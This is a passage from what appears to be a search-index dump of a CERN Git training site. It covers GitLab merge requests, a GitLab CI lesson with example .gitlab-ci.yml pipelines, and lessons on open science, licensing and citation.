ssh://gitlab.cern.ch:7999/starter-kit-scratch/starter-kit-example.git\n !

Before opening\nthe Pull Request let's check the status of the remote repositories.\n Status of remote repositoriesHow do you use git log to see exactly what the two remote repositories\n(origin, and your fork) contain?\n SolutionClick to expandWe use the --decorate option to show local and remote branches and tags (-10\nis to limit the history to 10 commits):\n$ git log -10 --oneline --graph --decorate\n\nThis is the output (most recent commits are on top):\n* 256c9b6 (HEAD -> master, dberzano/master) Add user info for dberzano\n* 764051d (origin/master, origin/HEAD) Add initial README\nSo you will see that:\n\nthe main repository (origin/master) is behind yours\nyour local repository (master) and your remote fork (dberzano/master) are\nin sync and contain the commit you've just authored\n\n\nCreate a Pull (or Merge) Request\nAs we have said before, Pull Requests are not part of Git but they depend on\nthe provider hosting your Git repositories. On GitLab you need to point your\nWeb browser to your repository:\n\nhttps://gitlab.cern.ch/YOUR_CERN_USERNAME/starter-kit-example\n\nThen click on the + (plus) button and select New merge request:\n\nOn the next screen, select master as Source branch:\n\nthen click the green Compare branches and continue button. The next screen\nallows you to review the changes graphically (you need to go at the bottom of\nthe page and click the Changes tab):\n\nIf the changes look good to you, assign a title to your Merge Request, and an\nextended description. You should follow the same policies you use for writing\ncommit messages:\n\nkeep the Title below 50 characters (well, you don't need to count, but do\nyour best to keep it short!),\nadd any extra information in the Description field.\n\n Automatic Pull Request title and descriptionIf your Pull Request has only one commit, the Title and Description\nfields will be automatically filled for you.\n\n\nWhen you are ready to proceed, click on the big green Submit merge request\nbutton.\nNow, sit back and relax!\nDiscussing, amending, retiring a Merge Request\nOnce a Merge Request is opened the repository owners are notified (usually via\nemail), and they (or even somebody else, depending on the repository's\npermissions) can add comments and requests before accepting your changes.\nMerge Requests are each given a sequential number. The first ever merge request\non the example respository can be found at:\n\nhttps://gitlab.cern.ch/starter-kit-scratch/starter-kit-example/merge_requests/1\n\nThis is how a comment appears, and how you can reply to it:\n\nWhen you are ready just click on the Comment button.\nIn our example, we have realized that we wanted to add something more to the\nMerge Request before proceeding. Doing so is as simple as authoring and pushing\nmore commits.\nLet's go back to our local working directory, edit the file\nYOUR_CERN_USERNAME.txt and add a line to it:\n$ echo \"I hereby certify that this information is true.\" >> YOUR_CERN_USERNAME.txt\n\nNow commit:\n$ git commit -a -m 'Add information certification'\n\n[master d09c134] Add information certification\n 1 file changed, 1 insertion(+)\n...and finally push (once again, remember to do it to your remote):\n$ git push YOUR_CERN_USERNAME\n\nCounting objects: 3, done.\nDelta compression using up to 8 threads.\nCompressing objects: 100% (3/3), done.\nWriting objects: 100% (3/3), 359 bytes | 359.00 KiB/s, done.\nTotal 3 (delta 0), reused 0 (delta 0)\nTo ssh://gitlab.cern.ch:7999/dberzano/starter-kit-example.git\n   256c9b6..d09c134  master -> master\nVoilà, it's done: you have just added more commits to your Merge Request! Let's\nlook on the Web at the commits you have added. Go to the Merge Request page\nand click on the Commits tab at the bottom, here is a direct link for the example:\n\nhttps://gitlab.cern.ch/starter-kit-scratch/starter-kit-example/merge_requests/1/commits\n\n\n How come has this worked?Opening a Merge/Pull Request does not mean creating a static snapshot of your\nworking area at the time when you have opened it; instead, your working area\n(i.e. your branch on your remote, note that we are only using one branch\ncalled master, which is the default, for simplicity) is dynamically linked to\nthe Merge Request. The link disappears the moment the Merge Request is closed,\nor accepted.\n\nAdding commits to an existing Merge Request is the very essence of using Merge\nRequests: you submit your content for scrutiny, and reviewers will say what\nthey think before accepting it, giving you the ability to amend things as you\ngo.\nIf you or the maintainers of the project are not happy with a Pull Request it\ncan be retired by clicking on the orange Close merge request button on top\nof the page:\n\nAccepting a Pull Request\nWhen a Merge Request looks good, the repository owners will click on the\nMerge button:\n\nYour code is then finally included upstream. On your local repository, if you\nwant to work on a new feature, you can simply start over by fetching remote\nchanges first as explained earlier.\nThe social side of coding\nUsing Pull Requests can seem overly complicated at first, but they are a very\nefficient way to truly collaborate on large projects.\n\nA Pull Request represents an atomic unit of work. You can open a Pull\nRequest for adding a certain feature, composed by several commits with work in\nprogresses, minor fixes, major bug fixes. When merged, the feature is finally\nthere and complete, available to every collaborator. You reduce the chance of\nhaving incomplete and/or buggy features in released versions of the code.\nWhen writing a Pull Request, you know that your code will be viewed by\nsomeone. This makes you more attentive to what other persons will think\nwhen they see it, making you a better collaborator.\nSometimes, good code is like wine (it has to age a little bit to taste\nbetter). Pull Requests might stay open for a while before being accepted,\ndo not be in a rush: having your code reviewed (sometimes by the most annoying\nand pickiest reviewer!) is a chance for improvement.\n\n Behave on Pull Request discussionsSome Pull Requests on large projects can get rather controversial. Bear in mind\nthat Pull Requests are about facilitating collaboration for a common goal, and -\nas in real life - try not to go on a rampage, at least not too quickly!\n\nAutomatic testing\nMerge requests can be configured to prevent changes from being merged into the\nmain branch of a repository if any of the project's builds or tests fail to run\ncorrectly. This is useful to try and ensure that the master branch always\ncontains a \"good\" version of the project. See the continuous integration\nlesson for details on how to set this up with GitLab, along with a list of\nservices that can be used with other git hosts.\n Key Points\n\"Forking\" means to create your private editable copy of a remote project on\nthe servers\n\"Cloning\" means to download locally a remote repository and/or its fork\n\"Pull/Merge Requests\" allow for discussing code and content before including\nit\nAutomatic testing on Pull/Merge Requests ensures better upstream code quality\n\n\nCC BY 4.0 - Original\ncontent\n"},"git/10-conflict.html":{"url":"git/10-conflict.html","title":"Conflicts","keywords":"","body":"Conflicts\n Learning Objectives\nExplain what conflicts are and when they can occur.\nResolve conflicts resulting from a merge.\n\n\nAs soon as people can work in parallel, it's likely someone's going to step on someone\nelse's toes.

These tasks typically involve running tests for software packages or\ndeploying changes. In fact, this very website is tested and automatically\nupdated using CI jobs. In addition to the conventional uses, some physicists use\nthis to automatically build LaTeX documents or parts of their analyses.\nSome examples of CI services are Travis CI,\nCircleCi, AppVeyor and\nGitLab CI. In this lesson we\nwill use GitLab CI and it is integrated into CERN's GitLab instance that allows\ncontinuous integration to be used for free for both private and public git\nrepositories without the need to sign up to additional services.\nIn order to start using GitLab CI you just need to commit a file in the main\ndirectory of your repository called .gitlab-ci.yml. This file is used to\nspecify a pipeline, which can be built up of any number of interconnected stages\nwith each job having it's own environment. A minimal example of this file is:\nmy_first_job:\n    image: gitlab-registry.cern.ch/ci-tools/ci-worker:cc7\n    script:\n        - python -c 'import this'\n        - echo \"My first CI produced file\" > output.txt\n        - ls\n\nThis creates a single job named my_first_job and the image: key defines a\ndocker image\nwhich is used the define the environment that is used to run the job. In this case we use an\nofficial CERN CentOS 7 image.\nThe script: key then defines one or more commands which are executed\nsequentially. If any of the command return a non-zero exit code the execution\nstops and the \"build\" is marked as failed.\nOnce this file is committed and pushed you can go to the GitLab web interface\nfor your planets repository and click on the tab for \"Pipelines\".\n\nHere you can see any recent pipelines, at first our pipeline is marked as\npending while it waits for a suitable machine, known in GitLab CI as a runner,\nto be available. CERN provides a collection of shared runners which are\navailable to all users and these are automatically enabled for all repositories.\nTypically a trivial job like this one will take a few minutes to run, which is\nalmost entirely spent setting up the environment prior to starting the actual\njob. Once your job is completed you should be able to see the output of the job\nby clicking on the status of the pipeline:\n\nFollowed by name of the job you are interested in:\n\nIf you scroll down the page you should then be able to see the output of the\nthree commands:\n\n Checking jobsIf you ever want to check on a job's progress the log file can also be examined\nwhile a job is running using the same method.\n\nSometimes it is useful to be able to store files that are produced during a\npipeline, such as the output.txt file we have produced. Currently the file is\nautomatically deleted when the job ends, however, the output files and\ndirectories can be automatically kept for up to 30 days using by defining them\nas an \"artefact\". Additionally artefacts can be used in later stages in a\npipeline by being marked as a dependency.\nOur first pipeline can be extended to produced a plot using python and then\ncompile a LaTeX document using this plot by modify .gitlab-ci.yml to contain:\nstages:\n    - first_stage\n    - second_stage\n\nmy_first_job:\n    stage: first_stage\n    image: gitlab-registry.cern.ch/ci-tools/ci-worker:cc7\n    script:\n        - python -c 'import this'\n        - echo \"My first CI produced file\" > output.txt\n        - ls\n    artifacts:\n        paths:\n            - \"*.txt\"\n\nmake_plot:\n    stage: first_stage\n    image: continuumio/anaconda3:latest\n    before_script:\n        # Matplotlib should use a backend that is suitable for CI\n        - 'echo \"backend : Agg\" > matplotlibrc'\n    script:\n        - mkdir -p plots/\n        - python make_plot.py\n    artifacts:\n        paths:\n            - plots/\n\nmake_document:\n    stage: second_stage\n    image: gitlab-registry.cern.ch/ci-tools/ci-worker:cc7\n    before_script:\n        - yum install -y texlive ghostscript latexmk\n    script:\n        - latexmk -pdf my_document.tex\n    dependencies:\n        - make_plot\n    artifacts:\n        paths:\n            - my_document.pdf\n\nEach keyword in the configuration does the following:\n\nstages: Used to specify the order in which to run each stage. Each job is\nthen assigned to a particular stage using the stage key. All jobs in a\nstage can be executed in parallel, while later jobs will wait until all jobs\nin the previous stage have completed successfully.\nimage: Defines a docker image which is used to provide the environment\n(i.e. what software is installed) for the job.\nbefore_script: One or more commands which are executed before starting\nthe main job. This is typically used for installing software and generally\nsetting up the environment.\nscript: One or more commands to be executed.\nartifacts: Used to store files and directories produced by the job.\ndependencies: Used to specify previous jobs which create artefacts that\nare required by this job. These are then placed into the job's environment at\nthe same path that they were originally created at.\n\nSee the GitLab CI documentation for a\nfull description of the CI configuration file.\nAgain commit and push the .gitlab-ci.yml file along with\nmake_plot.py and my_document.tex\nand wait for the pipeline to complete. In the sidebar on the right you are then\nbe able to download some or all of the build artefacts like so:\n\n Debugging errors in `.gitlab-ci.yml`Sometimes it can be difficult to understand errors in the configuration of a\npipeline. Fortunately there is a helpful page\nwhich can be used to find errors or see how the configuration is interpreted\nwithout needing to make a commit.\n\n Additional CI configurationTo see the full documentation for what can be included in the CI configuration\nsee the official GitLab CI documentation.\n\n Special resources on runnersSome of the shared runners at CERN have special features available such as\nCVMFS. Additionally, you can make a private runner if you want to completely\ncontrol the runner and add features such a persistent storage between builds.\nSee the CERN documentation\nfor more details and examples for common use cases.\n\n Key Points\nContinuous integration can be used to run commands or scripts every time a\ncommit is pushed.\nThe .gitlab-ci.yml file is used to configure CI.\n\n\n"},"git/12-open.html":{"url":"git/12-open.html","title":"Open Science","keywords":"","body":"Open Science\n Learning Objectives\nExplain how a version control system can be leveraged as an electronic lab notebook for computational work.\n\n\n\nThe opposite of \"open\" isn't \"closed\".\nThe opposite of \"open\" is \"broken\".\n\nJohn Wilbanks\n\nFree sharing of information might be the ideal in science,\nbut the reality is often more complicated.\nNormal practice today looks something like this:\n\nA scientist collects some data and stores it on a machine\nthat is occasionally backed up by her department.\nShe then writes or modifies a few small programs\n(which also reside on her machine)\nto analyze that data.\nOnce she has some results,\nshe writes them up and submits her paper.\nShe might include her data—a growing number of journals require this—but\nshe probably doesn't include her code.\nTime passes.\nThe journal sends her reviews written anonymously by a handful of other people in her field.\nShe revises her paper to satisfy them,\nduring which time she might also modify the scripts she wrote earlier,\nand resubmits.\nMore time passes.\nThe paper is eventually published.\nIt might include a link to an online copy of her data,\nbut the paper itself will be behind a paywall:\nonly people who have personal or institutional access\nwill be able to read it.\n\nFor a growing number of scientists,\nthough,\nthe process looks like this:\n\nThe data that the scientist collects is stored in an open access repository\nlike figshare or\nZenodo, possibly as soon as it's collected,\nand given its own\nDigital Object Identifier (DOI).\nOr the data was already published and is stored in\nDryad.\nThe scientist creates a new repository on GitHub to hold her work.\nAs she does her analysis,\nshe pushes changes to her scripts\n(and possibly some output files)\nto that repository.\nShe also uses the repository for her paper;\nthat repository is then the hub for collaboration with her colleagues.\nWhen she's happy with the state of her paper,\nshe posts a version to arXiv\nor some other preprint server\nto invite feedback from peers.\nBased on that feedback,\nshe may post several revisions\nbefore finally submitting her paper to a journal.\nThe published paper includes links to her preprint\nand to her code and data repositories,\nwhich  makes it much easier for other scientists\nto use her work as starting point for their own research.\n\nThis open model accelerates discovery:\nthe more open work is,\nthe more widely it is cited and re-used.\nHowever,\npeople who want to work this way need to make some decisions\nabout what exactly \"open\" means and how to do it. You can find more on the different aspects of Open Science in this book.\nThis is one of the (many) reasons we teach version control.\nWhen used diligently,\nit answers the \"how\" question\nby acting as a shareable electronic lab notebook for computational work:\n\nThe conceptual stages of your work are documented, including who did\nwhat and when. Every step is stamped with an identifier (the commit ID)\nthat is for most intents and purposes unique.\nYou can tie documentation of rationale, ideas, and other\nintellectual work directly to the changes that spring from them.\nYou can refer to what you used in your research to obtain your\ncomputational results in a way that is unique and recoverable.\nWith a distributed version control system such as Git, the version\ncontrol repository is easy to archive for perpetuity, and contains\nthe entire history.\n\n Making Code CitableThis short guide from GitHub\nexplains how to create a Digital Object Identifier (DOI) for your code,\nyour papers,\nor anything else hosted in a version control repository.\n\n How Reproducible Is My Work?Ask one of your labmates to reproduce a result you recently obtained\nusing only what they can find in your papers or on the web.\nTry to do the same for one of their results,\nthen try to do it for a result from a lab you work with.\n\n How to Find an Appropriate Data Repository?Surf the internet for a couple of minutes and check out the data repositories\nmentioned above: Figshare, Zenodo,\nDryad. Depending on your field of research, you might\nfind community-recognized repositories that are well-known in your field.\nYou might also find useful these data repositories recommended by Nature.\nDiscuss with your neighbor which data repository you might want to\napproach for your current project and explain why.\n\n Can I Also Publish Code?There are many new ways to publish code and to make it citable. One\nway is described on the homepage of GitHub itself.\nBasically it's a combination of GitHub (where the code is) and Zenodo (the\nrepository creating the DOI). Read through this page while being aware\nthat this is only one of many ways to making your code citable.\n\n Key Points\nOpen scientific work is more useful and more highly cited than closed.\n\n\nCC BY 4.0 - Based on git-novice © 2016–2017 Software Carpentry Foundation\n"},"git/13-licensing.html":{"url":"git/13-licensing.html","title":"Licensing","keywords":"","body":"Licensing\n Learning Objectives\nExplain why adding licensing information to a repository is important.\nChoose a proper license.\nExplain differences in licensing and social expectations.\n\n\nWhen a repository with source code, a manuscript or other creative\nworks becomes public, it should include a file LICENSE or\nLICENSE.txt in the base directory of the repository that clearly\nstates under which license the content is being made available. This\nis because creative works are automatically eligible for intellectual\nproperty (and thus copyright) protection. Reusing creative works\nwithout a license is dangerous, because the copyright holders could\nsue you for copyright infringement.\nA license solves this problem by granting rights to others (the\nlicensees) that they would otherwise not have. What rights are being\ngranted under which conditions differs, often only slightly, from one\nlicense to another. In practice, a few licenses are by far the most\npopular, and choosealicense.com will\nhelp you find a common license that suits your needs.  Important\nconsiderations include:\n\nWhether you want to address patent rights.\nWhether you require people distributing derivative works to also\ndistribute their source code.\nWhether the content you are licensing is source code.\nWhether you want to license the code at all.\n\nChoosing a licence that is in common use makes life easier for\ncontributors and users, because they are more likely to already be\nfamiliar with the license and don't have to wade through a bunch of\njargon to decide if they're ok with it.  The Open Source\nInititative and Free Software\nFoundation both\nmaintain lists of licenses which are good choices.\nThis article provides an excellent overview of\nlicensing and licensing options from the perspective of scientists who\nalso write code.\n Licensing at CERNWhen developing software at CERN you should keep in mind the open grounds on\nwhich this international organization was constituted. CERN has a legal office\noffering counseling and guidelines for\nlicensing software and other kinds of materials: when in doubt do not hesitate\nto contact them for trustworthy advice.\n\nAt the end of the day what matters is that there is a clear statement\nas to what the license is. Also, the license is best chosen from the\nget-go, even if for a repository that is not public. Pushing off the\ndecision only makes it more complicated later, because each time a new\ncollaborator starts contributing, they, too, hold copyright and will\nthus need to be asked for approval once a license is chosen.\n Can I Use Open License?Find out whether you are allowed to apply an open license to your software.\nCan you do this unilaterally,\nor do you need permission from someone in your institution?\nIf so, who?\n\n What licenses have I already accepted?Many of the software tools we use on a daily basis (including in this workshop) are\nreleased as open-source software. Pick a project on GitHub from the list below, or\none of your own choosing. Find its license (usually in a file called LICENSE or\nCOPYING) and talk about how it restricts your use of the software. Is it one of\nthe licenses discussed in this session? How is it different?\n\nGit, the source-code management tool\nCPython, the standard implementation of the Python language\nJupyter, the project behind the web-based Python notebooks we'll be using\nEtherPad, a real-time collaborative editor\n\n\n Key Points\nPeople who incorporate GPL'd software into their own software must make their software also open under the GPL license; most other open licenses do not require this.\nThe Creative Commons family of licenses allow people to mix and match requirements and restrictions on attribution, creation of derivative works, further sharing, and commercialization.\nPeople who are not lawyers should not try to write licenses from scratch.\n\n\nCC BY 4.0 - Based on git-novice © 2016–2017 Software Carpentry Foundation\n"},"git/14-citation.html":{"url":"git/14-citation.html","title":"Citation","keywords":"","body":"Citation\n Learning Objectives\nMake your work easy to cite\n\n\nYou may want to include a file called CITATION or CITATION.txt\nthat describes how to reference your project;\nthe one for Software\nCarpentry\nstates:\nTo reference Software Carpentry in publications, please cite both of the following:\n\nGreg Wilson: \"Software Carpentry: Getting Scientists to Write Better\nCode by Making Them More Productive\".
